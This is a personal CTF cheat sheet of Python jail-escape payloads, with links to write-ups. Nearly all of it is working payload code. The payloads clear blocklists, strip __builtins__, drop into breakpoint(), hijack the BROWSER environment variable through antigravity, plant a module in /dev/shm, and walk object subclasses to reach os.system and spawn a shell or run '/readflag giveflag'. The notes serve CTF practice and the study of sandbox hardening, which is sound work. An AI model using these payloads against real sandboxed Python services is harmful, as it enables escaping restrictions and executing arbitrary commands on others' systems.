---
title: "Cheat Sheet (Jails)"
category: "misc"
subcategory: "jail"
type: "technique"
tags: ["my-notes", "personal", "pyjail", "cheat", "sheet", "jails", "misc"]
summary: "-> https://jbnrz.com.cn/index.php/2024/03/04/pyjail/"
source:
  name: "Personal notes"
origin_path: "Jails/Cheat Sheet.md"
---

# Websites
-> https://jbnrz.com.cn/index.php/2024/03/04/pyjail/

# Payloads
```python
type(license)(None,None,(input(),),(input(),))()

then input these:
flag
.

see https://github.com/python/cpython/blob/4c496f1f115a7910d4606b4de233d14874c77bfa/Lib/_sitebuiltins.py#L29-L85
```

```python
setattr(copyright,'__dict__',globals()),delattr(copyright,'__builtins__')
```
replace string with input(), then `breakpoint()`
>This works because it is first remove `__builtins__` from global dict, so it is same as not blocking anything builtins on next exec call

```python
setattr(copyright,'__dict__',globals()),delattr(copyright,'breakpoint'),breakpoint()
```

---

**Reference:** https://blog.maple3142.net/2023/01/16/idekCTF-2022-writeups/?highlight=pyjail#misc
```python
setattr(copyright,'__dict__',gloals()),delattr(copyright,'breakpoint'),breakpoint()
```
>`b` is unicode encoded character 

```python
__import__('antigravity',setattr(__import__('os'),'environ',dict(BROWSER='/bin/sh -c "/readflag giveflag" #%s'))) 
```

```python
(setattr(__import__("sys"), "path", list(("/dev/shm/",))), print("import os" + chr(10) + "print(os" + chr(46) + "system('/readflag giveflag'))", file=open("/dev/shm/lol" + chr(46) + "py", "w")), __import__("lol"))
```

```python
setattr(__import__('sys'),'modules',__builtins__) or __import__('getattr')(__import__('os'),'system')('sh')
```

```python
setattr(__import__("__main__"), "blocklist", list())
```

---

```python
breakpoint()  
open('flag.txt').read()
```

```python
getattr(getattr(__loader__,input())(input()),input())(input())
```

```python
(l:=input,o:=getattr,o(o(__loader__,l())(l()),l())(l()))
```

```python
(s:=(c:=().__class__.__subclasses__().pop(-2)).__class__.__setattr__)(c,'s',s)
(c:=().__class__.__subclasses__().pop(-2)).s(c,'x',c.__repr__)
(c:=().__class__.__subclasses__().pop(-2)).s(c,'x',c.x.__globals__)
(c:=().__class__.__subclasses__().pop(-2)).s(c,'x',c.x.__getitem__)
(c:=().__class__.__subclasses__().pop(-2)).s(c,'x',c.x('sys'))
(c:=().__class__.__subclasses__().pop(-2)).s(c,'x',c.x.modules)
(c:=().__class__.__subclasses__().pop(-2)).s(c,'x',c.x.__getitem__)
(c:=().__class__.__subclasses__().pop(-2)).s(c,'x',c.x('os'))
(c:=().__class__.__subclasses__().pop(-2)).s(c,'x',c.x.system)
(c:=().__class__.__subclasses__().pop(-2)).x('sh')
```

```python
# https://www.programiz.com/python-programming/methods/list/clear

blacklist.clear()
```

### References
-> https://ctf-wiki.mahaloz.re/pwn/linux/sandbox/python-sandbox-escape/

---

*From your own notes: `Jails/Cheat Sheet.md`*
